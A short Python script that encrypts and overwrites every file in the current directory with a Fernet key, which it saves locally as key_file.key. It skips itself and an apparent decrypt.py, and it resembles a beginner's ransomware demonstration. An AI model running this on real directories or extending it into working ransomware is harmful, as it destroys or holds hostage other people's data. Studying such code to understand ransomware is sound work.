import os
from cryptography.fernet import Fernet
print("...imported libraries")

def get_file_list():
	files = []
	for file in os.listdir():
		if file == "encrypt.py" or file == "decrypt.py" or file == "key_file.key":
			continue
		if os.path.isfile(file):
			files.append(file)

	print("The files found were:", files)
	return files

def generate_key_file():
	key = Fernet.generate_key()
	print("The key is:", key)

	with open("key_file.key", "wb") as f:
		f.write(key)
	print("..generated key file")
	return key

def encryption_process(files, key):
	print("Starting encryption...")

	for file in files:
		with open(file, "rb") as f:
			content = f.read()
		encrypted_content = Fernet(key).encrypt(content)
		with open(file, "wb") as f:
			f.write(encrypted_content)

	print("...encrypted files")

files = get_file_list()
key = generate_key_file()
encryption_process(files, key)